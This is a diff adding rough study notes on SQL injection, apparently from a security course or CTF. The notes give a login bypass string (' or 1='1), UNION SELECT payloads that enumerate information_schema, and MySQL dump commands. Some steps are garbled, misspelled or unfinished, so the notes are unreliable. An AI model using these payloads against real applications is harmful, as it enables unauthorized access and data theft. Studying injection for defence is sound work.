@@ -69,4 +69,40 @@ authors = tree.xpath('//small[@class="author"]/text()')
 
 print ('Authors: ", authors)
 
- _________________________________________________________________________________________________________________________________________________________________________________________________________________
+SQL ______________________________________________________________________________________________________________________________________________________________________________________________________________________
+## SQL ##
+SELECT and UNION (most used)
+## authenication bypass ##
+1. in username and password 'or1='1
+2. f12
+3. select post 
+4. go to left pane select request
+5. turn to raw
+6. add to url after a ? hit enter gives all values that equal true
+
+## database dump ##
+ssh into server (wiht root perms)
+&> mysql
+]> show databases ; (3 databases: informations_ scheme(most important), performance_scheme, mysql)
+];
+]> <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN>, from <NAME OF DATABASE>,<NAME OF TABLE>
+]> use information_schema ; 
+]> show tables ;
+]> show columns from columns ;
+]> select tireid,name,size from session.Tires ;
+
+## steps for SQL injection ##
+Step 1-Idenitfy Vulnerable Field/Selection
+<field> ' or 1='1
+Step 2- Identify the Number of Columns/Server Side Selections
+<field>' UNION SELECT 1,2,3,4 #
+Step 3 - Modify Golden Statement
+<feild>' UNION SELECT table_schema,2,table_name,column_name, 4 from information_schema.columns #
+Step 4 - Craft Queries
+<feild>' UNION SELECT 
+
+## GET method in URL ##
+step1: identify vulnerable selection
+selection= 2,3,4
+step2: identify number of  
+.com'\', 1)#
